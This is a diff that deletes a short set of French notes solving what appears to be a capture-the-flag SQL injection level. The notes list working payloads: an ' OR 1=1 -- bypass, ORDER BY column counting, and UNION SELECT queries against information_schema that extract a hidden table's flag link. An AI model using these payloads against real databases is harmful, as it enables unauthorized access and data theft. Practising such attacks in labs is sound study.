@@ -1,7 +1,0 @@
-1) injection sql : ' or 1=1 --  <- ne pas oublier l'espace car en mysql commentaire --+espace
-2) Niveau 1
--> Injecter -> ' OR 1=1 --
--> trouver le nombre de colonnes -> ' ORDER BY 5 -- -> faux donc 4 colonnes pour les chevaliers
--> trouver le nom des tables colonnes - 'union all select 1, table_name,3,4 from information_schema.tables --  on trouve la table fanion 
-  -> 'union all select 1, column_name,3,4 from information_schema.tables where table_name='fanion'-- -> on trouve la colonne lien_pertinent
-  -> 'union all select 1,lien_pertinent,3,4 from fanion-- et le lien du flag  
